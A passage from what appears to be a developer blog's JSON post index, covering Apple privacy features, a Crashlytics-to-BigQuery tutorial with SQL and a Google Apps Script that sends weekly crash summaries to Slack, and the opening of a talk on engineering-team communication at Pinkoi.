be emphasized that Apple is not working alone; SKAdNetwork has now reached version 2.0. Apple continues to collect developers‚Äô and advertisers‚Äô needs while integrating personal privacy controls, continuously enhancing the SDK‚Äôs features. I sincerely hope Deferred Deep Link can be integrated via SDK, as our goal is to enhance user experience without infringing on personal privacy.For technical details, refer to ‚ÄúWWDC 2021 ‚Äî Meet privacy-preserving ad attribution‚Äù.Cross-Platform All iOS ‚â• 13 apps that support third-party login must implement Sign in with Apple, or they cannot be successfully published on the App Store Name can be edited freely Can hide the real email (use Apple-generated virtual email instead) Users can request account deletion App must implement this by 2022/01/31 üÜï iOS &gt;= 15 iCloud+ Users Support Hide My Email Supports all email fields in Safari and apps Users can freely generate virtual email addresses in the settings. Like Sign in with Apple, use Apple‚Äôs generated virtual email instead of your real email. When you receive emails, Apple forwards them to your real inbox, protecting your email information.Similar to 10-minute mail, but more powerful; as long as you keep using it, that virtual mailbox address is yours permanently; there is no limit on adding new addresses, you can create unlimited ones. Not sure how Apple prevents abuse.Settings -&gt; Apple ID -&gt; Hide My EmailOthersApp privacy details on the App Store: Apps must disclose on the App Store which user data will be tracked and how it will be used .For detailed information, please refer to: ‚ÄúApp privacy details on the App Store‚Äù.Fine Control of Personal Privacy Data: iOS ‚â• 14 allows finer control over location and photo access, such as granting permission to only specific photos or allowing location access only while the app is in use.Test Project iOS ‚â• 15 introduces the CLLocationButton to enhance user experience. It lets users get their current location by tapping the button without prior permission or consent. This button is not customizable and can only be activated by user interaction.Personal Privacy Access Notice: iOS ‚â• 15 adds personal privacy access prompts, such as for clipboard, location, camera, and microphoneApp Privacy Report: iOS ‚â• 15 allows exporting a report of all apps‚Äô privacy-related feature usage and network activity from the past 7 days. Since the report file is a .ndjson plain text file, it is not easy to view directly; you can first download the ‚ÄúPrivacy Insights‚Äù app from the App Store to view the report. Go to Settings -&gt; Privacy -&gt; Scroll to the bottom ‚ÄúRecord App Activity‚Äù -&gt; Enable Record App Activity Save App Activity Select ‚ÄúImport to Privacy Insights‚Äù After importing, you can view the privacy report immediately. As mentioned in the news, WeChat does secretly read photo information in the background when the app is reopened. Also, I found several Chinese apps that secretly perform tasks, so I disabled all their permissions in the settings. If it weren‚Äôt for this feature that exposes them, we wouldn‚Äôt know how long our data has been stolen!RecapApple‚Äôs privacy principlesAfter reviewing the changes to privacy features over the years, let‚Äôs take a look back at Apple‚Äôs privacy principles: Data Minimization: Apple uses technology to limit access to only the necessary data. On-Device Processing: Private data is not uploaded to the cloud; all processing happens locally. Examples include Safari Private Click Measurement, Apple‚Äôs machine learning SDK CoreML, which also runs locally, Siri/Live Text in Camera on iOS ‚â• 15, Apple Maps, News, photo recognition features, and more. User Transparency and Control: New privacy access prompts, logging reports, and detailed privacy control features. Security: Data storage and transmission security, preventing misuse of UserDefault, iOS 15 supports end-to-end encryption and decryption with CryptoKit, transmission security with Private Relay. Fragmented DataBack to the very beginning, using technical methods to piece together Harry‚Äôs connection map, websites and apps are blocked from linking to each other, leaving only copy-paste usable, but with warnings.Personal data from service registration and third-party login can be protected by using Sign in with Apple and the Hide My Email feature; alternatively, use native iOS apps more frequently.Could Offline Events Help Modify Apple Card to Prevent Privacy Leaks? No one has any chance to piece together Harry‚Äôs activity outline anymore.Apple is People-CenteredTherefore, ‚Äúpeople-oriented‚Äù is the motto I associate with Apple. Going against the commercial market requires strong conviction. Related to this, ‚Äútechnology-oriented‚Äù is the motto I associate with Google, as Google consistently creates many geeky tech projects. Lastly, ‚Äúbusiness-oriented‚Äù is the motto I associate with Facebook, as FB often focuses solely on commercial profit in many aspects.Besides adjustments to privacy features, iOS has continuously enhanced its tools to prevent phone addiction in recent years, introducing features like ‚ÄúScreen Time Reports,‚Äù ‚ÄúApp Usage Limits,‚Äù and ‚ÄúFocus Mode‚Äù to help users break free from phone addiction.Finally, I hope everyone can Value Personal Privacy Not Controlled by Capital Reduce Virtual Addiction Preventing Social Decline Live a Brilliant Life in the Real World!Private Relay/IDFA/Pasteboard/Location Testing Project:References WWDC 2021 ‚Äî Apple‚Äôs privacy pillars in focus Apple privacy white paper ‚Äî A Day in the Life of Your Data WWDC 2021 ‚Äî Get ready for iCloud Private Relay WWDC 2021 ‚Äî Meet privacy-preserving ad attribution iOS 14 Clipboard Privacy Panic: The Dilemma Between Privacy and Convenience iOS Deferred Deep Link Implementation (Swift) iOS UUID Matters (Swift/iOS ‚â• 6) If you have any questions or suggestions, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "CrashlyticsÔΩúBigQuery Integration for Real-Time Crash Tracking and Alerts", "url": "/posts/zrealm-dev/crashlytics-bigquery-integration-for-real-time-crash-tracking-and-alerts-e77b80cc6f89/", "categories": "ZRealm Dev.", "tags": "english, ai-translation, ios-app-development, crashlytics, firebase, bigquery, slack", "date": "2021-10-19 22:33:30 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Crashlytics + Big Query Build a More Real-Time and Convenient Crash Tracking T...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Crashlytics + Big Query Build a More Real-Time and Convenient Crash Tracking ToolIntegrate Crashlytics and BigQuery to Automatically Forward Crash Logs to a Slack ChannelResultsPinkoi iOS Team Real PhotosFirst, show the result image. Weekly, regularly check the Crashlytics crash reports; filter out the top 10 most frequent crash issues; send the information to the Slack channel, allowing all iOS team members to quickly understand the current stability.QuestionFor app developers, the Crash-Free Rate is arguably the most important metric; it represents the percentage of users who did not experience a crash. I believe every app aims for a Crash-Free Rate close to 99.9%. However, this is unrealistic because any software can have bugs, especially since some crashes are caused by the underlying system (Apple) or third-party SDKs. Additionally, the size of the DAU (Daily Active Users) affects the Crash-Free Rate ‚Äî the higher the DAU, the more likely rare crash issues will occur.Since a 100% crash-free app does not exist, tracking and handling crashes is very important. Besides the most common Google Firebase Crashlytics (formerly Fabric), there are other options like Bugsnag and Bugfender. I haven‚Äôt personally compared these tools, so interested readers can explore them on their own. If you use other tools, the content introduced in this article may not apply.CrashlyticsBenefits of Choosing Crashlytics: Stable, Backed by Google Free, easy, and quick to install Besides crashes, you can also log error events (e.g., decode error). A complete Firebase suite can handle everything: other services include Google Analytics, Realtime Database, Remote Config, Authentication, Cloud Messaging, Cloud Storage‚Ä¶ Note: It is not recommended to build a full production service entirely on Firebase, as the costs can become very high once traffic increases‚Ä¶ it‚Äôs a kind of bait-and-switch model.Crashlytics also has many drawbacks: Crashlytics does not provide an API to query crash data Crashlytics only stores crash records for the past 90 days. Crashlytics has very poor support and flexibility for integrations. The biggest pain is the extremely poor support and flexibility of Integrations, combined with no API to write scripts for crash data syncing; you can only occasionally rely on manual checks in Crashlytics to view crash logs and track crash issues.Crashlytics Supported Integrations Only: [Email Notification] ‚Äî Trending Stability Issues (Increasing Crash Problems Encountered by More Users) [Slack, Email Notification] ‚Äî New Fatal Issue (Crash Problem) [Slack, Email Notification] ‚Äî New Non-Fatal Issue (Non-Crash Problem) [Slack, Email Notification] ‚Äî Velocity Alert (Sudden Increase in Crash Issues) [Slack, Email Notifications] ‚Äî Regression Alert (Issues Previously Solved but Reappeared) Crashlytics to Jira issue The content and rules of the above Integrations cannot be customized.At the very beginning, we directly used 2.New Fatal Issue to Slack or Email. For Email, it would trigger subsequent scripts via Google Apps Script; however, this notification would bombard the channel nonstop because crashes caused by any issue‚Äîbig or small, or even sporadic problems from user devices or iOS itself‚Äîwould all trigger notifications. As DAU grew, the channel was flooded with these alerts daily, but only about 10% of them were truly valuable, related to errors in our code that many users encountered.As a result, it does not solve the issue of Crashlytics being hard to track automatically, and still requires a lot of time reviewing whether the problem is important.Crashlytics + Big QueryAfter searching around, I only found this method, and the official source only provides this one; this is the trap behind the free offering. I guess neither Crashlytics nor Analytics Event has or plans to release an API for users to query data via API. This is because the official recommendation is to import data into BigQuery, and exceeding the free storage and query limits in BigQuery incurs charges. Storage: The first 10 GB each month is free. Query: The first 1 TB per month is free. (Query quota means how much data volume is processed when running a Select) For detailed information, please refer to the Big Query pricing guideFor Crashlytics to BigQuery setup details, please refer to the official documentation. You need to enable GCP services, link a credit card, and more.Getting Started with Big Query to Query Crashlytics LogsAfter setting the Crashlytics Log to Big Query import cycle and completing the first data import, we can start querying the data.First, go to your Firebase project -&gt; Crashlytics -&gt; click the ‚Äú‚Ä¢‚Ä¢‚Ä¢‚Äù at the top right of the list -&gt; select ‚ÄúGo to BigQuery dataset‚Äù.Go to GCP -&gt; Big Query, then in the left ‚ÄúExplorer‚Äù select ‚Äúfirebase_crashlytics‚Äù -&gt; choose your Table name -&gt; ‚ÄúDetail‚Äù -&gt; on the right, you can view Table information, including last modified time, used storage, retention period, and more. Confirm that the imported data can be queried.The top tab allows you to switch to ‚ÄúSCHEMA‚Äù to view the table‚Äôs column information or refer to the official documentation.Click the ‚ÄúQuery‚Äù button at the top right to open the interface with the assisted SQL Builder (recommended if you are not familiar with SQL):Or directly click ‚ÄúCOMPOSE NEW QUERY‚Äù to open a blank Query Editor:No matter which method is used, it‚Äôs the same text editor; after entering the SQL, you can preview automatic SQL syntax checking and the estimated query cost in the upper right corner (This query will process XXX when run.):After confirming the query, click ‚ÄúRUN‚Äù at the top left to execute it. The results will appear in the Query results section below. ‚ö†Ô∏è Pressing ‚ÄúRUN‚Äù to execute the query will count toward your query quota and incur charges; please be careful not to run random queries.If you are less familiar with SQL, you can first learn the basics, then refer to Crashlytics‚Äô official example for customization:1. Count the number of crashes per day in the last 30 days:SELECT COUNT(DISTINCT event_id) AS number_of_crashes, FORMAT_TIMESTAMP(\"%F\", event_timestamp) AS date_of_crashesFROM `‰Ω†ÁöÑProjectID.firebase_crashlytics.‰Ω†ÁöÑTableName`GROUP BY date_of_crashesORDER BY date_of_crashes DESCLIMIT 30;2. Query the Top 10 Most Frequent Crashes in the Last 7 Days:SELECT DISTINCT issue_id, COUNT(DISTINCT event_id) AS number_of_crashes, COUNT(DISTINCT installation_uuid) AS number_of_impacted_user, blame_frame.file, blame_frame.lineFROM `‰Ω†ÁöÑProjectID.firebase_crashlytics.‰Ω†ÁöÑTableName`WHERE event_timestamp &gt;= TIMESTAMP_SUB(CURRENT_TIMESTAMP(),INTERVAL 168 HOUR) AND event_timestamp &lt; CURRENT_TIMESTAMP()GROUP BY issue_id, blame_frame.file, blame_frame.lineORDER BY number_of_crashes DESCLIMIT 10; However, the official example‚Äôs query results are sorted differently from what Crashlytics shows, likely because it groups by blame_frame.file (nullable) and blame_frame.line (nullable).3. Query the top 10 devices with the most crashes in the past 7 days:SELECT device.model,COUNT(DISTINCT event_id) AS number_of_crashesFROM `‰Ω†ÁöÑProjectID.firebase_crashlytics.‰Ω†ÁöÑTableName`WHERE event_timestamp &gt;= TIMESTAMP_SUB(CURRENT_TIMESTAMP(), INTERVAL 168 HOUR) AND event_timestamp &lt; CURRENT_TIMESTAMP()GROUP BY device.modelORDER BY number_of_crashes DESCLIMIT 10;For more examples, please refer to the official documentation. If your SQL returns no data, first confirm that the specified Crashlytics data has been imported into BigQuery (for example, the default SQL example queries crash records of the current day, but the data may not have synced yet, so no results will be found); if data is confirmed, then check whether the filter conditions are correct.Top 10 Crashlytics Issue Big Query SQLHere, we refer to the official example in section 2 for modification. We want the result to match the crash issues and sorted data as seen on the first page of Crashlytics.Top 10 Crash Issues in the Past 7 Days:SELECT DISTINCT issue_id, issue_title, issue_subtitle, COUNT(DISTINCT event_id) AS number_of_crashes, COUNT(DISTINCT installation_uuid) AS number_of_impacted_user FROM `‰Ω†ÁöÑProjectID.firebase_crashlytics.‰Ω†ÁöÑTableName`WHERE is_fatal = true AND event_timestamp &gt;= TIMESTAMP_SUB( CURRENT_TIMESTAMP(), INTERVAL 7 DAY ) GROUP BY issue_id, issue_title, issue_subtitle ORDER BY number_of_crashes DESC LIMIT 10;Compare the Top 10 crash issues from Crashlytics, matches ‚úÖ.Use Google Apps Script to Periodically Query &amp; Forward to SlackGo to the Google Apps Script homepage -&gt; Sign in with the same account as Big Query -&gt; Click ‚ÄúNew Project‚Äù at the top left, then rename the project by clicking the top left again after opening the new project.First, let‚Äôs connect to Big Query to fetch the query data:Refer to the official documentation example and insert the above Query SQL.function queryiOSTop10Crashes() { var request = { query: 'SELECT DISTINCT issue_id, issue_title, issue_subtitle, COUNT(DISTINCT event_id) AS number_of_crashes, COUNT(DISTINCT installation_uuid) AS number_of_impacted_user FROM `firebase_crashlytics.‰Ω†ÁöÑTableName` WHERE is_fatal = true AND event_timestamp &gt;= TIMESTAMP_SUB( CURRENT_TIMESTAMP(), INTERVAL 7 DAY ) GROUP BY issue_id, issue_title, issue_subtitle ORDER BY number_of_crashes DESC LIMIT 10;', useLegacySql: false }; var queryResults = BigQuery.Jobs.query(request, '‰Ω†ÁöÑProjectID'); var jobId = queryResults.jobReference.jobId; // Check the status of the Query Job. var sleepTimeMs = 500; while (!queryResults.jobComplete) { Utilities.sleep(sleepTimeMs); sleepTimeMs *= 2; queryResults = BigQuery.Jobs.getQueryResults(projectId, jobId); } // Retrieve all rows of results. var rows = queryResults.rows; while (queryResults.pageToken) { queryResults = BigQuery.Jobs.getQueryResults(projectId, jobId, { pageToken: queryResults.pageToken }); Logger.log(queryResults.rows); rows = rows.concat(queryResults.rows); } var data = new Array(rows.length); for (var i = 0; i &lt; rows.length; i++) { var cols = rows[i].f; data[i] = new Array(cols.length); for (var j = 0; j &lt; cols.length; j++) { data[i][j] = cols[j].v; } } return data}query: The number of meals can be freely changed to a pre-written Query SQL.The returned object structure is as follows:[ [ \"67583e77da3b9b9d3bd8feffeb13c8d0\", \"&lt;compiler-generated&gt; line 2147483647\", \"specialized @nonobjc NSAttributedString.init(data:options:documentAttributes:)\", \"417\", \"355\" ], [ \"a590d76bc71fd2f88132845af5455c12\", \"libnetwork.dylib\", \"nw_endpoint_flow_copy_path\", \"259\", \"207\" ], [ \"d7c3b750c3e5587c91119c72f9f6514d\", \"libnetwork.dylib\", \"nw_endpoint_flow_copy_path\", \"138\", \"118\" ], [ \"5bab14b8f8b88c296354cd2e\", \"CoreFoundation\", \"-[NSCache init]\", \"131\", \"117\" ], [ \"c6ce52f4771294f9abaefe5c596b3433\", \"XXX.m line 975\", \"-[XXXX scrollToMessageBottom]\", \"85\", \"57\" ], [ \"712765cb58d97d253ec9cc3f4b579fe1\", \"&lt;compiler-generated&gt; line 2147483647\", \"XXXXX.heightForRow(at:tableViewWidth:)\", \"67\", \"66\" ], [ \"3ccd93daaefe80f024cc8a7d0dc20f76\", \"&lt;compiler-generated&gt; line 2147483647\", \"XXXX.tableView(_:cellForRowAt:)\", \"59\", \"59\" ], [ \"f31a6d464301980a41367b8d14f880a3\", \"XXXX.m line 46\", \"-[XXXX XXX:XXXX:]\", \"50\", \"41\" ], [ \"c149e1dfccecff848d551b501caf41cc\", \"XXXX.m line 554\", \"-[XXXX tableView:didSelectRowAtIndexPath:]\", \"48\", \"47\" ], [ \"609e79f399b1e6727222a8dc75474788\", \"Pinkoi\", \"specialized JSONDecoder.decode&lt;A&gt;(_:from:)\", \"47\", \"38\" ]]You can see it is a two-dimensional array.Add Slack Forwarding Function:Add a new function below the above code.function sendTop10CrashToSlack() { var iOSTop10Crashes = queryiOSTop10Crashes(); var top10Tasks = new Array(); for (var i = 0; i &lt; iOSTop10Crashes.length ; i++) { var issue_id = iOSTop10Crashes[i][0]; var issue_title = iOSTop10Crashes[i][1]; var issue_subtitle = iOSTop10Crashes[i][2]; var number_of_crashes = iOSTop10Crashes[i][3]; var number_of_impacted_user = iOSTop10Crashes[i][4]; var strip_title = issue_title.replace(/[\\&lt;\\|\\&gt;]/g, ''); var strip_subtitle = issue_subtitle.replace(/[\\&lt;\\|\\&gt;]/g, ''); top10Tasks.push(\"&lt;https://console.firebase.google.com/u/1/project/‰Ω†ÁöÑProjectID/crashlytics/app/‰Ω†ÁöÑÂ∞àÊ°àID/issues/\"+issue_id+\"\\|\"+(i+1)+\". Crash: \"+number_of_crashes+\" times (\"+number_of_impacted_user+\" users) - \"+strip_title+\" \"+strip_subtitle+\"&gt;\"); } var messages = top10Tasks.join(\"\\n\"); var payload = { \"blocks\": [ { \"type\": \"header\", \"text\": { \"type\": \"plain_text\", \"text\": \":bug::bug::bug: iOS Top Crash Issues in the Last 7 Days :bug::bug::bug:\", \"emoji\": true } }, { \"type\": \"divider\" }, { \"type\": \"section\", \"text\": { \"type\": \"mrkdwn\", \"text\": messages } }, { \"type\": \"divider\" }, { \"type\": \"actions\", \"elements\": [ { \"type\": \"button\", \"text\": { \"type\": \"plain_text\", \"text\": \"View Last 7 Days in Crashlytics\", \"emoji\": true }, \"url\": \"https://console.firebase.google.com/u/1/project/‰Ω†ÁöÑProjectID/crashlytics/app/‰Ω†ÁöÑÂ∞àÊ°àID/issues?time=last-seven-days&amp;state=open&amp;type=crash&amp;tag=all\" }, { \"type\": \"button\", \"text\": { \"type\": \"plain_text\", \"text\": \"View Last 30 Days in Crashlytics\", \"emoji\": true }, \"url\": \"https://console.firebase.google.com/u/1/project/‰Ω†ÁöÑProjectID/crashlytics/app/‰Ω†ÁöÑÂ∞àÊ°àID/issues?time=last-thirty-days&amp;state=open&amp;type=crash&amp;tag=all\" } ] }, { \"type\": \"context\", \"elements\": [ { \"type\": \"plain_text\", \"text\": \"Crash counts and affected versions only include data from the last 7 days, not all data.\", \"emoji\": true } ] } ] }; var slackWebHookURL = \"https://hooks.slack.com/services/XXXXX\"; // Replace with your in-coming webhook url UrlFetchApp.fetch(slackWebHookURL,{ method : 'post', contentType : 'application/json', payload : JSON.stringify(payload) })} If you don‚Äôt know how to get the incoming WebHook URL, refer to the ‚ÄúGetting Incoming WebHooks App URL‚Äù section in this article.Testing &amp; Scheduling SetupAt this point, your Google Apps Script project should have the two Functions mentioned above.Next, select the ‚ÄúsendTop10CrashToSlack‚Äù function above, then click Debug or Run to test it once; since the first run requires authentication, please run it at least once before proceeding to the next step.After successfully running a test once, you can start scheduling automatic execution:Select the alarm icon on the left, then choose ‚Äú+ Add Trigger‚Äù at the bottom right.The first ‚ÄúChoose which function to run‚Äù (the entry point for the function to execute) should be changed to sendTop10CrashToSlack. The schedule can be set according to personal preference. ‚ö†Ô∏è‚ö†Ô∏è‚ö†Ô∏è Please note that each query accumulates and incurs charges, so do not set it carelessly; otherwise, automated scheduling may run and cause bankruptcy.CompletedExample Result ImageFrom now on, you can quickly track current app crash issues directly on Slack; you can even discuss them there.App Crash-Free Users Rate?If you want to track the App Crash-Free Users Rate, refer to the next article ‚ÄúCrashlytics + Google Analytics Automated Query for App Crash-Free Users Rate‚ÄùFurther Reading Crashlytics + Google Analytics Automatic Query for App Crash-Free Users Rate Automate Routine Tasks with Python + Google Cloud Platform + Line Bot Slack Builds Fully Automated WFH Employee Health Reporting System Forward Gmail Messages to Slack Using Google Apps Script If you have any questions or feedback, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "High-Efficiency Engineering TeamsÔΩúPinkoi Tech Career Talk Insights", "url": "/posts/pinkoi-engineering/high-efficiency-engineering-teams-pinkoi-tech-career-talk-insights-11f6c8568154/", "categories": "Pinkoi Engineering", "tags": "english, ai-translation, pinkoi, automation, ios-app-development, engineering-management, workflow", "date": "2021-09-09 20:13:53 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!2021 Pinkoi Tech Career Talk ‚Äî Secrets to a High-Efficiency Engineering TeamPi...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!2021 Pinkoi Tech Career Talk ‚Äî Secrets to a High-Efficiency Engineering TeamPinkoi High-Efficiency Engineering Team Revealed Tech Talk SharingHigh-Efficiency Engineering Team Revealed2021/09/08 19:00 @ Pinkoi x YouratorMy MediumÔºö ZhgChgLiAbout the TeamPinkoi operates through multiple Squads: Buyer-Squad: Focused on Buyer-Side Features Seller-Squad: Focused on Designer-Side Features Exploring-Squad: Focused on Browsing and Exploration Ad-Squad: Focused on Platform Advertising Out-Of-Squad: Mainly provides support, infrastructure, or process optimization Each Squad is composed of members from various functions, including PM, Product Designer, Data, Frontend, Backend, iOS, Android, and more; long-term, ongoing work goals are accomplished by the Squad.Besides Squads, there are also some cross-team Run Projects, mostly with short to medium-term work goals. The Project Owner can be the initiator or any team member in any role. Once the task is completed, the project is closed. At the end of the article, there is a section on how Pinkoi‚Äôs culture supports team members in solving problems. If you are not interested in the specific actions taken, you can go directly to the bottom of the page to read this section.Relationship Between Group Size and EfficiencyThe relationship between team size growth and work efficiency: I have experience in startups with teams of 10 people up to teams of 100 (haven‚Äôt yet experienced teams of 1,000). Just growing from 10 to 100, a tenfold increase, makes a significant difference in many aspects.With fewer people, communication and task handling are very fast. You can discuss in person, and the response will come immediately; because the ‚Äúhuman connection‚Äù is very strong, everyone can collaborate in sync.But when there are many people, direct communication becomes difficult because more collaborators are involved. If everyone talks at once, the whole morning can be wasted. Also, since everyone collaborates with many others, tasks must be prioritized. Non-urgent matters cannot be addressed immediately, so asynchronous waiting is necessary while working on other things.More roles can enable more detailed and professional division of labor, provide higher productivity or better quality, and faster output.As mentioned at the beginning, conversely, there will be more collaboration with people, and collaboration means more communication time.Small issues can be magnified. For example, if one person needs 10 minutes daily to submit reports, it‚Äôs acceptable; but if it involves 20 people, it adds over 3 extra hours daily. In this case, optimizing and automating report submission becomes valuable, saving 3 hours per day. Over 250 working days a year, that amounts to 750 hours wasted.As the team grows, taking the App Team as an example, these roles will have closer collaboration.Backend ‚Äî API, Product Designer ‚Äî UI goes without saying. Since Pinkoi is an international product, all functional text needs to be translated by the Localization Team. Also, because we have a Data Team handling data collection and analysis, besides developing features, we need to discuss event tracking points with the Data Team.Customer Service is also a team that frequently interacts with us. Besides users sometimes reporting order issues directly through mall reviews, more often users leave a one-star rating indicating a problem. At this time, we need the customer service team to help investigate further by asking what the issue is and how we can assist.With so many collaborations, it means many communication opportunities. But remember, we are not avoiding or minimizing communication; excellent communication skills are also important for great engineers.Our focus should be on important communication, such as brainstorming ideas, discussing requirements, and scheduling. Avoid wasting time on repeated confirmations or vague, unfocused discussions, including unnecessary back-and-forth questions.Especially in the pandemic era, communication time is precious and should be spent on more valuable discussions.‚ÄúI thought you thought I thought you thought‚Äù ‚Äî this sentence perfectly illustrates the consequences of unclear communication.Let‚Äôs not talk about work. In daily life, misunderstandings often happen due to different perceptions. A relaxed and comfortable life relies on mutual understanding; however, this doesn‚Äôt apply to work. If both parties have different understandings and don‚Äôt discuss them deeply, it‚Äôs easy to realize at the output stage that things are completely different from what was expected.Interface CommunicationThe idea introduced here is to communicate through a consensus interface, similar to the Dependency Inversion Principle in SOLID principles of object-oriented programming (it‚Äôs okay if you don‚Äôt understand this); the same concept can be applied in communication.The first step is to identify which areas are unclear, require repeated confirmation, or need specific communication to be more focused and effective, or even which deliverables can eliminate the need for additional communication.Once the problem is identified, the ‚Äúinterface‚Äù can be defined. An interface means a medium, which can be a questionnaire, process, checklist, tool, etc.Use this ‚Äúinterface‚Äù as a bridge for communication. There can be multiple interfaces; use the one that fits the scenario. For the same scenario, prioritize this interface for initial communication. If further discussion is needed, use this interface to focus on the issue in depth.Collaboration Between the App Team and External PartnersHere are four examples of interface communication using the App Team collaboration as an example:The first case involves collaborating with the backend, where the above situation may occur before any interface consensus is reached.Regarding how to use the API, simply providing the API response string to the App Team can lead to ambiguities. For example, with a date field, how do we know if it refers to the Register Date or Birthday? Also, since the scope is broad, many fields need clarification.This communication is also repetitive; every time there is a new Endpoint, it needs to be confirmed again.This is a classic example of ineffective communication.The missing link between the App and Backend is a communication interface. There are many solutions, and it doesn‚Äôt have to be a tool; it could simply be a manually maintained document.This section was shared at the 2020 Pinkoi Developer Night ‚Äî by TokiPinkoi uses Python (FastAPI) to automatically generate documentation from API code. PHP can use Swagger (previous company practice); the advantage is that the overall structure and data format of the documentation can be automatically generated from the code, reducing maintenance costs and only requiring proper handling of field descriptions.p.s. Currently, new Python 3 projects use FastAPI. Older parts will be updated gradually. For now, PostMan is used as the communication interface.The second is collaboration with Product Designers, which is basically similar to working with Backend, but the focus shifts to confirming UI Specs and verifying Flows.If color codes and fonts are scattered, our app will suffer greatly. Setting aside the fact that the requirements are like this, we don‚Äôt want situations where the same title has the same color but different color codes, or where the UI is inconsistent in the same position.The most basic solution is to have the designer organize the UI component library, establish a Design System (Guideline), and properly label the UI during delivery.We build corresponding Fonts and Colors in the Code Base according to the Design System (Guideline), and create Buttons and Views based on the component library.When templating, consistently use these pre-built components, so we can quickly align by directly referring to the UI design drafts. But this can easily get messy and requires dynamic adjustment; it should neither cover too many special cases nor stubbornly reject any expansion.p.s. Collaboration between Pinkoi and Product Designers is mutual; Developers can also suggest better approaches and discuss them with Product Designers.The third is the interface with Customer Service. Store reviews are very important for products, but it is a very manual and repetitive process of referral communication.Because we need to manually check for new reviews from time to time, and if there are customer service issues, forward them to the support team for assistance, it is very repetitive and manual.The best solution is to have store reviews automatically synced to our work platform. We can either pay for existing services or use the tools I developed: ZhgChgLi / ZReviewTender (new in 2022). Deployment methods, tutorials, and technical details can be found at: ZReviewTender ‚Äî Free Open-Source App Reviews Monitoring BotThis bot is our communication interface. It automatically forwards reviews to the Slack Channel, allowing everyone to quickly receive the latest review updates and track, communicate, and discuss them there.The last example involves dependency on the Localization Team; whether it‚Äôs new features or updating old translations, we need to wait for the Localization Team to finish their work before we can assist further.The cost of developing this tool in-house is too high, so we directly use third-party services to help us eliminate dependencies.All translations and keys are managed by third-party tools. We only need to set the keys in advance to work independently. Both sides just need to finish their tasks before the deadline without relying on each other. After the Localization Team completes the translation, the tool will automatically trigger a git pull to update the latest text files into the project.p.s Pinkoi adopted this process early on, initially using Onesky. However, in recent years, there are many better tools available that you can consider using.Collaboration Relationships Within the App TeamWhat was just mentioned is external; now let‚Äôs talk about internal.When there are few people, or when a single developer maintains a project, you can do whatever you want. Your grasp and understanding of the project are very high, so there are usually no major issues. Of course, if you have good sense, even a one-person project can accomplish everything mentioned here.However, as more teammates collaborate, all working under the same project, it would be disastrous if everyone works independently.For example, calling an API here, doing this there, often reinventing the wheel and wasting time, or not caring at all and just rushing to launch, will greatly increase future maintenance and scalability costs.Within the team, rather than calling it an interface, it feels too distant; it should be called consensus or resonance to foster a stronger sense of team spirit.The most basic and common topic is Coding Style, including naming conventions, placement, how to use Delegates, etc. You can enforce these using industry-standard tools like realm / SwiftLint. For multilingual strings, you can organize them with freshOS / Localize. (Of course, if you are already managing these uniformly with third-party tools mentioned earlier, you may skip this.)The second is the app architecture. Whether it‚Äôs MVC, MVVM, VIPER, or Clean Architecture, the key is to keep it clean and consistent. There‚Äôs no need to chase trends; consistency is what matters. Pinkoi App Team uses Clean Architecture. Previously at StreetVoice, it was pure MVC but clean and consistent, making collaboration smooth.There are also UnitTests. With many people involved, it‚Äôs hard to avoid accidentally breaking the logic you wrote; having more tests provides extra protection.Finally, there is the documentation part, which covers the team‚Äôs workflows, specifications, or operation manuals. This helps teammates quickly reference when they forget something and allows new members to get up to speed quickly.Besides the Code Level interface, there are other interfaces that help us improve collaboration efficiency.The first step is a Request for Comments phase before implementing the requirement. The developer briefly explains how the requirement will be addressed, and others can provide feedback and ideas.Besides preventing reinventing the wheel, it also encourages brainstorming. For example, others can consider how to expand or use it later, or what future needs might be taken into account‚Ä¶ Sometimes those involved are confused, while outsiders see clearly.Second, conduct thorough Code Reviews to ensure our interface standards are implemented, such as naming conventions, UI layout methods, delegate usage, protocol/class declarations, and so on.Also, check if the architecture is misused or if code is hastily written due to time pressure. For example, if the development direction aims for full Swift adoption, verify that no Objective-C code is still being submitted.The main focus is on reviewing these, followed by assistance with whether the functions work properly or not.p.s. The purpose of an RFC is to improve work efficiency, so it should not be too lengthy or seriously delay progress; think of it as a simple pre-work discussion.Summarizing the interface consensus within the team, the final mention of a crash theory mindset strikes me as a good behavioral benchmark.Excerpted from MBA LibraryApplied to a team, it means assuming everyone suddenly disappears‚Äîcan the existing code, processes, and systems allow new people to quickly get up to speed?Recap Interface Meaning: Interfaces within the team are used to build mutual understanding, while collaboration outside the team aims to reduce ineffective communication. Using interfaces for communication has no shortcuts; focus on discussing requirements.To reiterate, ‚Äúinterface communication‚Äù is not a special term, tool, or engineering concept. It is simply a concept applicable to collaboration in any job scenario. It can be just a document or a process, and it must exist first before communication can take place.Assuming each extra communication takes 10 minutes, with a team of 60 people and 10 